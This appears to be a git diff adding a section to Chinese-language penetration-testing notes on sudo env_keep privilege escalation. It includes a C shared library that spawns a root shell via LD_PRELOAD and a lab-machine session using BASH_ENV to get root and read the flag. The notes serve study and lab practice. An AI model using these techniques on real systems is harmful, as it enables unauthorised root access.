@@ -136,6 +136,58 @@ https://gtfobins.github.io/基本上就靠这个里面的东西来提权了
 
 通过这个命令列出我们能sudo执行的命令，然后去搜一下这些命令如何生成/bash等shell
 
+#### env_keep
+
+还有另一种利用方式，例如这个靶机
+
+```bash
+hish@environment:/tmp$ sudo -l
+Matching Defaults entries for hish on environment:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty
+
+User hish may run the following commands on environment:
+    (ALL) /usr/bin/systeminfo
+
+```
+
+可以注意到的是`env_keep+="ENV BASH_ENV"`这个env_keep表示我们在切换用户上下文时候会保留的环境，我们可以重写这个环境来利用
+```bash
+env_reset 表示重置环境变量，用sudo执行命令时把之前的环境变量清除。
+
+env_keep+=LD_PRELOAD 在保持原有环境变量的同时，增加动态链接器，预加载共享库，有这个选项就可以用来提权。 LD为linker dynamic动态链接器，LD_PRELOAD 是一个用于加载共享库的环境变量，通常在运行程序之前设置，以便在程序启动时预先加载指定的库。
+
+$ vi shell.c	//定义一个共享库 
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+
+	//预加载，优先于main函数执行
+    void _init() {
+            unsetenv("LD_PRELOAD"); //只执行一次即可，所以把预加载环境卸掉
+            setgid(0);
+            setuid(0);
+           	system("/bin/bash");
+
+$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+//-fPIC：生成与位置无关的代码,允许共享库在内存中的任何位置加载和执行。-shared：生成一个共享库而不是可执行文件。-nostartfiles：不使用标准系统启动文件，用于自定义启动代码。
+
+$ sudo LD_PRELOAD=./shell.so find	//利用find的sudo权限执行之前，预加载LD，从而提权。虽然在上述sudo -l的结果中，find本身就可以提权。
+```
+以上内容是结合了LD预载劫持以及env_keep的联合利用方式。对于env这个靶机而言，我们可以通过下述方法来进行。
+```bash
+hish@environment:~$ echo 'bash -p' > exp.sh
+hish@environment:~$ chmod +x exp.sh 
+hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo 
+root@environment:/home/hish# id
+uid=0(root) gid=0(root) groups=0(root)
+root@environment:/home/hish# cat /root/root.txt 
+943dd249259dxxxxxxxxxxxx
+root@environment:/home/hish# 
+
+```
+
+
 ### 内核漏洞
 
 `uname -a`命令得出的系统信息，我们可以上网搜一下有没有内核提权漏洞，这些漏洞基本上就是一些老一点的系统才存在。`searchsploit`命令也能搜索。
